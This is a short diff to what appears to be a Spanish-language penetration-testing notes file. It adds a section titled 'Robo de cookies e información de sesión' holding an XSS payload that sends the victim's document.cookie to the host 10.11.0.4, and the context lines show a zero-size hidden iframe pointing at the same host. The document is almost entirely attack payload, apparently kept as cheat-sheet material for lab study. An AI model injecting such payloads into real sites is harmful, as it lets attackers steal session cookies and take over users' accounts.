@@ -32,3 +32,8 @@ C:\xampp\xampp_stop.exe
 ```
 <iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe> 
 ```
+
+#### Robo de cookies e información de sesión
+```
+<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script> 
+```
